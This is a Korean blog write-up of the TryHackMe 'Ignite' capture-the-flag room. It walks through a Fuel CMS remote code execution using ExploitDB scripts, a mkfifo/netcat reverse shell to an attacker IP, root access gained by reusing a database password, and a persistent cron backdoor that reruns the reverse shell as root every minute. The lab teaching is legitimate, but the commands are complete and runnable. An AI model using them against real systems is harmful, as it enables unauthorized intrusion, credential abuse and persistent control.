<h1>Tryhackme - ignite(2)</h1>

<h2>#3 Exploit</h2>

이전에 searchsploit 으로 취약점을 파악 했다.
RCE와 SQL injection 두가지 설명을 앞서 하였고 이제는 exploit을 할 것이다.
우리가 가지고 있는 정보로 활용해야할 취약점에 대해서 조금만 더 파악하고 가보자.

발견된 취약점은 정말 다양하게 활용이 가능하다.
- 공격된 PC를 내마음대로 조종을 하거나
- 다른 사람의 개인정보를 열람
- 다른 사람이 시킨 주문을 취소하거나 어떤 게시판에 달린 댓글을 삭제하기 등등
취약점에 따라 다르게 활용을 할 수 있다.

내가 하고 있는 취약점은 내가 해킹하는 PC를 어떤 명령어로든 실행을 할 수 있게 할 것이다(RCE를 사용할 것이다.)

취약점을 조사할 때 가장 우선순위로 봐야하는 취약점이 RCE다 RCE는 다른 말로도 표현이 되는데
Remote Code Execution = Code injection = Command Execution = Command injection = overflow 등등

#3.1 RCE활용

RCE를 수행 시켜줄 프로그래밍 코드를 작성해야하는데 칼리리눅스에는 이 취약점들을 이용하여 사용할 수 있는 공격 코드들이 기본적으로 내장되어있다. 만약 이것이 없다면 google에서 검색해서 사용하면 된다

파일의 경로는 `/usr/share/exploitdb/exploits/~` 이곳에 저장되어있다.
경로가 기억이 안나면 `find / -name "47138.py" 2> /dev/null` 

```
ls -l /usr/share/exploitdb/exploits/linux/webapps/47138.py
cp /usr/share/exploitdb/exploits/linux/webapps/47138.py ./exploit1.py

cp /usr/share/exploitdb/exploits/linux/webapps/49487.rb ./exploit2.rb

cp /usr/share/exploitdb/exploits/linux/webapps/50477.py ./exploit3.py
```

1. 공격 코드가 txt 일때 -> 취약점을 설명해둔 파일 --> 파일을 가지고 할 순 없고 직접 공격 코드를 만들어 사용하면 됨
2. .py -> python exploit.py
3. .rb -> ruby exploit.rb
4. .c -> c언어 코드로 작성되어서 실행하기 위해선 컴파일을 해야하는데 리눅스에서는 gcc를 이용해서 하면된다 --> gcc exploit.c -o exploit

![이미지](/assets/ignite/5.png)

에러가 발생했는데 여기서 알고 있으면 좋은 점 파이썬은 2가 있고 3가 있는데 이 에러처럼 print옆에 원래 ()이러한 괄호가 들어가는데 만약 괄호가 없으면 python2 이다 이럴땐 `python2` 라고 붙여서 실행하면된다


![이미지](/assets/ignite/6.png)

실행은 되었지만 다시 이상한 에러가 발생했다. HTTPConnectionPool 에러가 발생 -> 뭔가 연결하면서 에러가 발생 한 것인데, 우리가 공격할 IP는 127.0.0.1:8080이 아니라서 코드를 변경해 줘야한다.


ruby 파일을 실행 시키면 docopt가 없다는 에러가 발생하는데 이때는 `gem install docopt` 를 이용하여 설치를 한후에 실행

![이미지](/assets/ignite/7.png)

id 명령어를 정상적으로 실행된 모습
공격한 시스템에서 id라는 명령어가 정상적으로 실행된 모습이다. (내 PC에서의 id 명령어를 실행한 것이 아님.)

![이미지](/assets/ignite/8.png)

3번째 취약점에서도 정상적으로 실행되었다. 
우리가 원하는 shell을 획득한 것이다 하지만 다른 디렉터리로 이동을 하면 이동이 안되는데 이것으로 보아 온전히 완벽히 shell을 획득하지 못한 것이라고 볼 수 있다. 1회용 shell 이라고 보면된다. 자유롭게 사용이 안된다는 것이라서 최고 사용자 권한을 얻기 위해서 작업을 해야한다. 이것을 `POST-Exploit` 이라고 한다.

<h2>#4 Reverse Shell </h2>

이전에는 shell 까지 획득을 하였는데 온전한 shell을 얻기 위해서 `Reverse Shell` 이라는 기법을 사용할 것이다.

#4.1 reverse shell
| reverse shell 은 거꾸로 연결을 받는다 라는 뜻이다.

기본적으로 악성코드를 설치할 때는 공격 타켓에 설치를 하고 프로세스를 실행하여 열린 포트로 접근을 하는데 이것을 `Bind Shell` 이라고 한다. 이것을 거꾸로 하는 것을 reverse shell 이라고 하는데
왜 거꾸로 하는가??
-> 악성 프로세스를 실행시키면 피해자 PC에서 특정 포트를 여는 것 자체가 의심스럽고 또한 방화벽이라는 보안 장치가 실행되고 있어 뚤리지 않을 것이다. 그래서 `Bind Shell`은 잘 먹히지가 않을 것이다.

reverse shell은 반대로 공격자 측에서 포트를 여는 것이다. 즉 프로세스를 피해자 PC에서 실행 시키는 것이 아닌 공격자 PC에서 실행시킨 후에 공격자 PC의 포트로 연결되도록 악성코드를 만들어 피해자에서 실행시켜서 컴퓨터를 연결하는 기법이다.

*흔히들 방화벽에서는 인바운드 규칙은 굉장히 디테일하게 까다롭게 하지만 아웃바운드 규칙은 까다롭게 하지 않거나 아예 설정조차 하지 않는 허점을 이용해서 해킹을 하는 것이다.*

#4.2 활용

1. 공격자 컴퓨터에서 포트를 열고 있기.
 - `nc -nlvp` : 특정 포트를 열겠다.

 ![이미지](/assets/ignite/9.png)

2. 피해자 PC에서 공격자 PC로연결을 한다.
 - google 에서 reverse shell cheat sheet 라고 검색한 후에 코드 획득
 - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.65.126 5555 >/tmp/f` nc mkfifo를 사용 (피해자 PC에서 명령어 입력)

 ![이미지](/assets/ignite/10.png)
 이 모습이 reverse shell을 획득한 모습이다. 이 상태에서는 디렉터리 경로도 이동이 가능하다 하지만 아직도 살짝 부족한 점이 있다면 최고 사용자(root) 사용자가 아닌 것이다.

<h2>#5 Post-Exploit </h2>

내가 접속한 컴퓨터를 정말 내것을 완전 내것으로 만드는 작업이다.
대표적으로 *권한 상승* & *Back Door* 심기를 해 볼것이다.

#5.1 권한 상승

정말 많은 방법이 있지만 기본적인 원리는 이 시스템에서 존재하는 정보들을 활용해서 권한을 상승시킬 수 있는 요소를 파악하는 것이다. 그러기 위해선 이 시스템을 먼저 파악해야한다.

1. 계정 정보 확인 (/etc/passwd)
 - `cat /etc/passwd | grep sh` 
 - 계정에 root 계정 하나 밖에 없지만, 만약 마리오계정(일반사용자 계정)이 있으면 마리오계정을 해킹한 다음에 root로 올라갈 수도 있는 방법이 있다.

2. fuel 웹 페이지를 사용하고 있기 때문에 fuel 디렉터리에 들어가 확인
 - ![이미지](/assets/ignite/11.png)
 - 웹 서버를 해킹 했다면 가장 먼저 찾아야 하는 것은 DB에 대한 정보이다. 그래서 DB정보에 대한 것은 핵심적인 디렉터리에 보면 무조건 있을 수 밖에 없다(연동이 되려면 DB에 대한 정보를 가지고 있어야 연동이 되기 때문에)

3. DB 계정 정보 찾기
 - 보통 설정 파일에 많이 있음
 - `find ./ -name "*conf* 2> /dev/null`
 - ![이미지](/assets/ignite/12.png)
 - modules는 모듈이기 때문에 아마 없을 것이고, application 부분에 있지 않을까 라는 생각이 든다
 - application/config 안에 보면 database.php 라는 파일이 있는데 역시나 db에 대한 정보가 들어가 있었다.
 - ![이미지](/assets/ignite/13.png)
 - db의 아이디가 root 이다..나는 권한 상승을 하기 위해서 root 계정으로 로그인해야하는데 db의 패스워드가 혹시 root의 패스워드 이지 않을까?? 라는 것을 `크리덴셜 스터핑` 이라고 한다. (실제로 공격률이 높다고 한다. 나 또한 똑같은 비밀번호를 돌려 쓰기 때문이다)

4. DB 정보로 root 사용자 로그인 해보기
 - ![이미지](/assets/ignite/14.png)
 - `su root` 로 전환을 해보려 했지만 실패 했다. 이 에러를 해결해주기 위해서 자주 사용해야할 명령어가 있다. 쉘을 얻었는데 인터렉티브한 쉘을 얻지 못했을 때 사용하면 된다.
 - `python -c "import pty;pty.spawn('/bin/bash')"`
 - ![이미지](/assets/ignite/15.png)
 - 최고 사용자 까지 획득을 하였다.

권한 상승의 원칙
1. 이 시스템에서 얻을 수 있는 정보를 찾는다
2. 만약 정보를 찾을 수 없다면 DB안에 있는 정보를 보거나 OS 버전 정보를 찾아 `privilege escalation` (권한 상승) 취약점을 찾아 실행을 해주면된다.

#5.2 Back Door 설치

이 시스템에 또 들어오기 위해서 똑같은 작업을 반복하게 하지 않게 하기 위해서 Back Door를 설치한다.
cron을 이용하여 실행할 것인데, 리눅스에서 사용하는 스케쥴 시스템이다.

1. cron 에 추가하기
 - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.65.126 5555 >/tmp/f`이 명령어를 1분 마다 실행하게 만들 것이다.
 - /etc/crontab에서 설정할 수 있다.
 - `echo "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.65.126 5555 >/tmp/f" >> /etc/crontab` -> 매 분마다 root 권한으로 명령어를 실행시켜줘.
 - ![이미지](/assets/ignite/16.png)

2. 다시 재접속 하기
 - crontab에 넣어졌기 때문에 이제 1분마다 명령어가 실행되기 때문에 언제든지 들어갈 수 있게 된다.
 - 재접속 할땐 `nc -nlvp 5555` 명령어를 통해서 접속을 하면 된다.


정리
Post-exploit은 exploit(shell 획득)이후에 일어나는 모든 행동을 post-exploit 단계에 넣을 수 있다.
권한 상승이나 백도어 설치는 정말 일부에 불과하다. 다른것은 무엇을 할 수 있냐면 이 시스템 옆에 있는 다른 연결된 PC를 공격할 수도 있거나 중요한 파일을들 가져오거나 랜섬웨어를 걸 수도 있을 것이고 등등 다양한 작업들을 Post-exploit으로 이야기 할 수 있을 것이다.











